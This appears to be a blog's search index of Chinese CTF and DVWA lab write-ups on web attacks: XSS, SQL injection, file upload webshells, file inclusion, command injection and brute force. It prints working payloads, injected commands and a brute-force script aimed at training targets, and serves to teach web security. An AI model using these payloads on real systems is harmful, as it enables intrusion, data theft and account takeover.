<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[bugku 26-27 writeup(web)]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-26-27%2F</url>
    <content type="text"><![CDATA[一、第26题（过狗一句话）打开链接发现一篇空白，抓包也没什么发现。那么我们只能分析上面那段代码了explode()函数就是把$poc变量用#号来分割开来。那么$poc_2就是assert,他和最后一句代码构造成了assert()函数,assert函数功能跟eval类似，可以把里面的内容当作代码来执行。 那么我们构造payload为?s=print_r(scandir(&#39;./&#39;))，扫描出描本级目录下的文件。（这其实是一种xss攻击）发现了flag_sm1skla1.txt文件。访问该文件即可得出flag拓展：我们扫描上级目录 http://123.206.87.240:8010/?s=print_r(scandir(%27../%27)) 根据目录结构应该是linux系统，hosts文件应该在etc里面 http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27)) 一、第27题（字符？正则？）打开题目，是一段代码 &lt;?php highlight_file(&apos;2.php&apos;); $key=&apos;KEY{********************************}&apos;; $IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM ){ die(&apos;key is: &apos;.$key); } ?&gt; 分析这段代码可以发现，只要我们构造出一个符号条件的KEY作为参数传入即可得到flag,突然发现我的正则学了和没学一样。 这边先介绍下 preg_match — 执行一个正则表达式匹配 preg_match ( $pattern , $subject , $matches ) 搜索subject与pattern给定的正则表达式的一个匹配. 参数 ： pattern : 要搜索的模式，字符串类型(正则表达式)。subject : 输入的字符串。matches :（可有可无）如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 返回值 ： preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 实例1： $label = &apos;content/112&apos;; $a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc); var_dump($a); var_dump($mc); 输出： int(1) array(2) { [0]=&gt; string(11) &quot;content/112&quot; [1]=&gt; string(3) &quot;112&quot; } 开始分析下题目中的正则表达式定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符; \ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 我们构造id=keykeyaaaakey:/a/keyz;]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 22-24 write up（web）]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-22-24%2F</url>
    <content type="text"><![CDATA[一、第22题（速度要快)首先我们查看源码 &lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt; 发现有post需要提交，参数为marign 那么我们开始抓包，然后发现是base64编码的flag,解码后，输入flag,发现flag错误。额，我们再次抓包，发现flag又变化了。怪得题目说我觉得你得快点。我有尝试了几次发现还是不行，看来只能借助python脚本了 import requests import base64 url = &apos;http://123.206.87.240:8002/web6/&apos; s = requests.session() flag = s.get(url).headers[&apos;flag&apos;] # flag在响应头里 #为了下面使用split不报错，ba64decode操作的对象是byte类型的字符串，而split函数要用str类型 flag = base64.b64decode(flag).decode() flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode() # 获取flag后的值 payload = {&apos;margin&apos;: flag} print(s.post(url, data = payload).text) # post方法上传 python中str是经过编好码的字符串，如unicode,gb2312,ascii编码，可以表示不同语言中的字符，可以解码成bytebyte是字节，只能是ascii码0-255的字符，表示未经编码处理的原始字符串 split函数简单的介绍 str与byte的简单的转化方法： flag=flag.decode()//byte转为str flag=flag.encode()//str转为byte 二、第23题（cookie欺骗）http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=打开题目发现，filename参数后面是一串base64编码，进行解码得keys.txt.我们把index.php进行base64编码后放在filename参数的后面，进行输入 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 改变line后面的数字即可一行一行的输出index.php的内容这样子太慢了，我们写个python脚本来实现。 import requests def getHTMLText(url): try: r = requests.get(url,timeout=30) r.raise_for_status() r .encoding = r.apparent_encoding return r.text except: return&quot;产生异常&quot; if __name__==&quot;__main__&quot;: a=30 for i in range(a): url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot; print(getHTMLText(url)) 输出index.php的网页源码 &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); ​ if(isset($_COOKIE[‘margin’]) &amp;&amp; $_COOKIE[‘margin’]==’margin’){ $file_list[2]=&apos;keys.php&apos;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt; 这段代码的意思是flag在keys.php文件里，我们需要传入cookie:margin=margin才可以看到源码。进行操作后发现是空白，我们查看源码发现了flag 三、第24题（never give up）查看源码发现那么我们访问http://123.206.87.240:8006/test/1p.html发现是bugku的主页，被重定向了。那么我们使用 view-source:http://123.206.87.240:8006/test/1p.htm 直接访问源码，发现源码中有一部分被url编码了，那么我们进行解码，发现是base64编码，再解码发现是url编码，那么我们再解码，终于得出了以下关键的部分 &quot;;if(!$_GET[&apos;id&apos;]) { header(&apos;Location: hello.php?id=1&apos;); exit(); } $id=$_GET[&apos;id&apos;]; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if(stripos($a,&apos;.&apos;)) { echo &apos;no no no no no no no&apos;; return ; } $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) { require(&quot;f4l2a3g.txt&quot;); } else { print &quot;never never never give up !!!&quot;; } ​ ?&gt; 看下这部分源码发现有很多要求才可以看到flag,那么尝试下直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt 看到flag了。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 17-20 write up（web）]]></title>
    <url>%2F2019%2F03%2F14%2Fbugku-17-20%2F</url>
    <content type="text"><![CDATA[一、第17题（输入密码查看flag）。暴力破解，可得密码，然后输入密码可得flag 二、 第18题(点击一百万次)查看源码可以发现，url以post的方式提交点击的次数，那么使用hacker的post功能，直接修改clicks=1000000,即可得出flag 三、第19题（备份是个好习惯）小知识：备份文件的扩展名一般为*.swp，.bak打开题目是一串字母，应该是MD5加密我们拿去解密下，竟然为空。看看题目的提示，备份是个好习惯，是让我们寻找 .bak文件的我们用御剑扫描后台，得出那么尝试下http://123.06.87.240:8002/web16/index.php.bak成功下载源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//代码从?后开始截取到str中，也就是变量后开始截取字符串 $str = substr($str,1);//取$str中左边第1位开始取1位。 $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//在字符串$str中找到字符串key，并把它替换成空； parse_str($str);//把查询字符串解析到变量中； echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;; } 代码要求我们构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就可以了，（kekeyy绕过过滤key） 四、第20题（成绩单）在这里插入代码片我们先输入1发现输出输入-1发现没有输出信息说明存在sql注入。那么我们尝试下输入 -1&#39; union select 1,2,3,database()#发现flag的所在的数据库输入-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#爆出flag所在的表 输入-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#爆出flag所在的字段 输入-1&#39; union select 1,2,3,skctf_flag from fl4g# 爆出flag为BUGKU{Sql_INJECT0N_4813drd8hz4}]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之xss]]></title>
    <url>%2F2019%2F03%2F14%2FDVWA-xss%2F</url>
    <content type="text"><![CDATA[一、反射（reflected）型（一）、尝试low等级输入正常数字，返回以下内容再输入&lt;xss&gt;发现，只输出了hello我们使用火狐的开发者工具查看下元素发现hello的后面是一对xss标签我们进行弹窗测试输入&lt;script&gt;alert(/xss/)&lt;/script&gt;发现弹窗，说明存在xss注入介绍javaScript的3个弹窗函数alert() ,confirm() ,prompt()攻击者思路攻击者web设计构造估计的js脚本 document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中构造并发送攻击url这样子还不行还需要url编码最后劫持会话修改cookie，修改为之前获取的cookie值。 （二）、尝试medium等级，只要在&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，因为他过滤了&lt;sript&gt;标签其他步骤与low等级一样。（三）尝试high等级。上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的 &lt;img src= x onerror=alert(1)&gt; 使用iframe标签也可以成功注入&lt;iframe onload=alert(1)&gt;说明只过滤了script标签（四）impose等级查看源码发现htmlspecialchars函数那么这是函数是干啥的呢？可以把 &amp;过滤成&amp;amp; &quot;过滤成&amp;quto; &apos;过滤成&amp;apos; &lt;过滤成&amp;lt; &gt;过滤成&amp;gt; 二、存储型（stored）反射（一）、尝试low等级，使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。那么我们就抓包发送name,message参数成功绕过了限制存储型的数据是存在数据库里，大家可以选择setup/resetDB重置数据库，清楚数据（二）尝试medium等级发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗这个是部分源码我们尝试iframe标签 txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook 发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入 （三）、尝试high等级和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理（四）、尝试impose等级查看源码name和message都对&lt; &gt; \” &amp; \’进行了过滤 三、DOM型XSS（一）、尝试low等级我们尝试注入 http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt; 成功进行注入，查看源码发现，没有任何保护措施（二）、尝试medium等级发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。查看源码发现只过滤了script标签那么我们尝试 下&lt;img src= x onerror=alert(1)&gt;页面没有反应查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用我们尝试闭合option `http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt; 发现还没没有闭合成功。我们闭合用的&gt;&lt;被闭合到option的值当中去了。那么我们往更高一层的select标签闭合 http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt; 成功注入（三）、尝试high等级尝试了一番之后没有结果我们查看下源码，发现源码使用了白名单的方法，那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; 成功注入 （四）、impose等级发现我们输入什么都会在客户端体现，查看源码发现在客户端进行了保护。这段代码的功能是不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[file upload]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-upload%2F</url>
    <content type="text"><![CDATA[一、尝试low等级我们上传一个phpinfo.php文件，文件内容为&lt;?php echo pphpinfo()?&gt;,把路径拼接起来，输入 http://localhost/DVWA/hackable/uploads/phpinfo.php 成功获得执行我们上次的文件我们再上传个一句话木马文件然后直接尝试系统命令 http://localhost/DVWA/hackable/uploads/cmd.php ?cmd=system(&apos;net user&apos;); 二、尝试medium等级上传一句话木马文件，发现报错，只支持jpeg和png格式的图片那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。三、high等级前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片在cmd窗口下用命令结合 copy 1.jpg/b +1.txt/a 2.jpg 结合成2.jpg我们用编辑器打开，在文件末尾发现了我们的一句话木马 那既然传上去了，那么我们要怎么用呢首先我们需要切换下服务器，切换成nginx在phpini配置文件里把下面这个参数改为一，默认是1然后输入http://localhost/DVWA//hackable/uploads/2.jpg/2.php即可上传]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file includes]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-includes%2F</url>
    <content type="text"><![CDATA[一、前置知识1、什么是文件包含一种代码处理方法，函数如include,require等，参数是文件名。2、文件包含漏洞文件名的参数用户可控且过滤不严，被攻击者偷梁换柱 二、尝试low等级打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可The PHP function allow_url_include is not enabled我们点击文件一、文件2、文件3、发现了下图的规律。那么我们尝试下输入 http://localhost/DVWA/vulnerabilities/fi/?page=test.php 那么我们就可以利用这个漏洞了，输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini ..\的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用..\..\ 直接输出了这个文件的内容 那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码 输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php 这说明了文件包含不仅仅显示内容还会执行文件。 那什么会执行远程文件吗？我们再次尝试可以执行并且非php文件里面只要包含php代码就可以执行 那么问题又来了。远程执行php文件和非php文件有什么差别吗？当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行） 三、尝试medium等级用low等级的方法发现依然成功。但是他和low的等级有什么差别吗差别在于它过滤了../而low的等级没有。第一张图为low等级，第二张图为medium等级代码。可以发现差别在于str_place()函数他把我们传入的参数中的../和..\&quot;替换成了空。还有https://和http://替换成了空 那么medium等级的远程文件可以执行吗。当然可以了既然过滤了http://那么我们可以使用httphttp://://如下图 四、high等级我们尝试了medium等级的方法，进行本地文件执行发现以下错误经常一番尝试发现只执行以file开头的文件。那么这里就不得不提到file协议了 那么什么是files协议呢就是文本传输协议，访问本地计算机中的文件 输入 http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php file://后面是本地路径，成功执行本地文件也可以查看系统文件 http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini 那么怎样进行远程文件执行呢medium方法不可以，查看源码，可知用fnmatch()函数限制参数文件的开头进入impose等级那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的high等级部分说明了]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brute Force]]></title>
    <url>%2F2019%2F03%2F09%2FBrute-Force%2F</url>
    <content type="text"><![CDATA[一、 第一题先从难度是low的开始。我们尝试了下admin’# 直接把密码注释掉，成功破解。我们尝试下medium等级还是尝试了下admin’#，发现密码错误，看来这个漏洞被防护了 首先我们抓包看下http请求头的信息，发现可以在http头部看到看到我们提交的账号密码，既然这样我们使用owasp zap 软件暴力破解。这是我使用的字典，大家可以去百度搜索更多的字典暴力成功破解出账号密码。下面我们尝试high等级，发抓包发现多了个user_token(它的职责是保护用户的用户名及密码多次提交，以防密码泄露。)且每一次的user_take会被记录到下一次请求头里的referrer里。这样上面的方法我们就不能使用了。但是认真观察，我们可以发现第一次进登录页面是没有user_token，这就是突破口。那么就可以一直在登录界面和第一次登录进行破解。还有一种思路是虽然加了user_token,但是并没有对尝试的次数进行限制，我们可以先获取user_token，然后用user_token加上用户密码验证身份。我们使用python脚本自动化爆力破解(第二种思路)。 from bs4 import BeautifulSoup import requests header={ &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;, &apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Host&apos;:&apos;127.0.0.1&apos; } requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;) #返回的是一个list列表 user_token=input[0][&apos;value&apos;] #获取用户的token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;password.txt&quot;): requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &apos;admin&apos; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) # 尝试次数 if(i==20): break ) 我们继续查看impose等级，发现输错3次就被限制15分钟无法登入。那么还有什么是可以防止暴力破解的呢？还有验证码。]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[command injection]]></title>
    <url>%2F2019%2F03%2F09%2Fcommand-injection%2F</url>
    <content type="text"><![CDATA[一、什么是命令注入1、概念通过web应用程序在服务器上拼接系统命令。简单说就是注入的命令是系统命令，而注入是靠连接来完成的。常见的windows命令：ipconfig，查看本地网络net user,查看系统用户 dir “./ ” 查看当前目录 等等常见的命令拼接符有&amp;&amp;, &amp; ,|, || 二、尝试low等级输入127.0.0.1发现输出的内容就是在cmd执行ping命令的结果，也就是说它调用了系统命令，于是我们尝试下输入127.0.0.1 &amp; net user注入成功 三、尝试medium等级 四、尝试下high等级发现注入，那么我们采用 | 连接，发现注入成功我们查看源码，发现了原因 五、尝试下impose等级发现它现在了我们的IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号 如果不输出显示结果怎么办]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 12-16 write up(web)]]></title>
    <url>%2F2019%2F03%2F09%2Fbugku-12-16%2F</url>
    <content type="text"><![CDATA[一、第12题（头等舱）先尝试火狐浏览器的开发者工具，发现响应头为136字节，可是参数确说有139字节，隐藏了3个字节那么我们使用burp suit 抓包，然后使用repeater功能，go一下发现flag（flag即为隐藏的字节） 二、第13题（网站被黑）首先，根据域名和网页提示，我们需要找到网站后台。我们使用御剑工具直接扫除后台成功扫出网站后台进入网站后台，尝试了一些admin,password常用的密码之后，发现登入不了。我们使用burp suite,爆破功能进行爆破扫出密码为hack,输入密码即可得到flag 三、第14题（管理员系统）使用火狐浏览器开发者工具查看源码发现有段加密的base64代码解密后为test123，题目又提示，IP禁止访问，请联系本地管理员登陆，IP已被记录.。那么我们就给header添加个X-Forwarded-For: 127.0.0.1参数。 四、第15题（web4）观察源码发现，有一堆utf-8加密的字符，那么我们进行utf-8解密这个是解密后的结果观察eval函数语句可知，我们应该输入，p1+54aa2+p2的值,输入果然得出flag 五、第十六题（flag在index里）点击进去。发现这是个文件包含漏洞那么我们采用PHP伪协议，输入http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php会发现出现了base64代码。进行解码得到index.php的源码，发现flag被注释掉这就是我们为什么要使用base64编码输出的原因。 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt; php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。 通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。 而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码 本题参考这篇博客解答：https://blog.csdn.net/zpy1998zpy/article/details/80585443]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 1~11题 write up（web）]]></title>
    <url>%2F2019%2F03%2F06%2Fbugku-1-11%2F</url>
    <content type="text"><![CDATA[一、第一题（web2）查看源代码，查找flag,即可得出flag。 二、第二题（计算器）输入163，发现只能输入一位数。位数被限制了。我们使用火狐浏览器的开发者工具（F12）调出来。定位到输入框的位置。发现最大位数被限制了，把1改成3即可得出flag。 三、第三题(web基础$_GET)打开题目发现是PHP代码，阅读代码可知，我们在URL中传入参数?what=flag即可得出flag 四、第四题(web基础$_POST)打开题目发现是PHP代码，阅读代码可知，需要使用POST方式传值。使用火狐浏览器的hackbar插件，如图 五、第五题（矛盾）先介绍下is_numeric()函数：is_numeric() 函数用于检测变量是否为数字或数字字符串。PHP 版本要求：PHP 4, PHP 5, PHP 7如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。 分析代码，可知，num必须==1，但是又不能是数字或者是数字字符串。 ==又表示只要值相等就可以了。那么我们可以在输入num=1XXX，xxx表示非数字。 六、第六题（web3）1、进入题目发现一直在弹窗，点了几遍确定后感觉被耍了。2、阻止弹窗查看源码。发现flag在最后一行的alert标签里。且被注释掉3、发现flag是&amp;#x类型的，这是unicode编码。不知道也没事，百度下就可以知道4、百度搜索unicode在线解码，就可以得出flag。 七、第七题（域名解析）看到题目域名解析我们就要想到hosts文件。我们打开hosts文件hosts文件位置C:\Windows\System32\drivers\etc在文件末尾加入123.206.87.240 flag.baidu.com在浏览器中输入flag.baidu.com或者123.206.87.240 即可得出flag 八、第八题（必须让他停下来）打开题目发现一直在刷新，观察源码，发现flag应该在图片刷出来的时候出现。我们使用burp suit进行抓包放包，经过了j几次（GO）操作之后，我们发现了flag. 九、第九题本地包含观察代码发现flag.php被隐藏起来了。尝试下传入参数?hello=hello,发现hello在下面代码中体现这样我们就可以直接传入参数输出flag.php文件的内容，发现flag。传入的参数是?hello=file(“flag.php”) 十、第十题（变量1）观察源码发现代码最后一行有个可变变量。我们让args=GLOBALS 全局数组变量 因为$args=GLOBALS 又var_dump($$args) ，所以和前面那个$ ，组成$GLOBALS flag变量又在$GLOBALS中，var_dump eval 成功得到flag $GLOBALS介绍 $GLOBALS[&#39;var&#39;]是外部的全局变量本身,在函数内部可以使用$GLOBALS数组调用2.作用域：Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 $GLOBALS超全局数组适用于任何地方 十一、第十一题（web5）首先介绍下JSPFUCkJSFuck（或为了避讳脏话写作 JSF*ck ）是一种深奥的 JavaScript编程风格。以这种风格写成的代码中仅使用 [、]、(、)、! 和 + 六种字符。此编程风格的名字派生自仅使用较少符号写代码的Brainfuck语言。与其他深奥的编程语言不同，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生 JavaScript 解释器皆可直接运行。鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式。简单地说，就是有人不想让自己的代码被别人认出来，用6种字符改造了自己的js代码 我们查看源码发现有一堆的 [、]、(、)、! 和 + ，把他们扔进浏览器控制台（火狐浏览器按F12打开控制台）进行调试，即可得出flag,记得要大写。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS和CSRF之介绍]]></title>
    <url>%2F2019%2F03%2F06%2Fxss1%2F</url>
    <content type="text"><![CDATA[一、什么是XSS全称：Cross Site Script中文名称：跨站脚本危害：盗取用户信息、钓鱼、制造蠕虫等 概念： 二、xss的分类1、存储型访问网站时，触发XSS我们可以通过查看网页源代码的方式查看xss的触发点。 我们安装irebug（F12快捷件打开），利用该火狐插件来寻找注入点。 分析其攻击过程但是xss脚本是怎样被黑客写入数据库呢2、反射型访问携带xss脚本的连接时触发xss 查看源码，寻找触发点 如何产生的呢（右边为xss源码）分析攻击过程 存储型xss和反射型xss的区别存储型xss是从数据库中提取xss的脚本内容反射型xss是直接从url的内容中提取出xss的脚本的内容 3、DOM型那什么是DOM呢，就是Document Object Model,即文档对象模型，它允许脚本（js）控制web的页面、窗口和文档。简单说DOM就是就是js操作html时的API(应用程序接口) 访问携带xss脚本的连接时触发xss 查看源码，了解触发点 分析原理 DOM型xss与反射型xss很类似，但是他们有什么区别呢DOM型xss是通过前端javascript将xss脚本写入DOM中，触发xss 反射型xss是通过后端或应用程序将xss脚本写入响应页面中，浏览器响应页面时才触发xss 存储型xss漏洞演示 xss代码应该为&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;，用管理员员登入后台，进入留言板会触发xss,出现弹窗内容为/xxxx/ 反射型xss漏洞演示我们写一个这样的脚本文件，命名为index.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_REQUEST[&quot;name&quot;])) { $name=$_REQUEST[&quot;name&quot;]; } else{ $name = &quot;&quot;; } echo &quot;hhhhh &quot;.$name; ?&gt; 本地访问下传入参数？name=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;alert（）方法用于显示一条指定的消息和一个ok按钮的警告框用qq浏览器尝试下，xss注入被浏览器拦截了，尴尬了 用火狐浏览器再次尝试，成功注入xss查看源码即可发现注入位置DOM型xss漏洞这边就不演示了 4、小结 三、CSRF是什么全称：Cross-site request forgery 中文名称是：跨站请求伪造 危害：执行恶意操作（”被转账“、“被发垃圾评论”等）、制造蠕虫······· 概念：利用客户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作 分析原理那里面恶意的网站是怎么做的呢？ 正常情况下：通常Cookie中会存放用户凭证信息浏览器在发送任何请求时都会带上已有的cookie通过cookie识别用户身份后，执行转账操作。 黑客的操作：伪造攻击代码，打开页面时自动完成转账]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Clickjacking(点击劫持)]]></title>
    <url>%2F2019%2F03%2F06%2FClickjacking%2F</url>
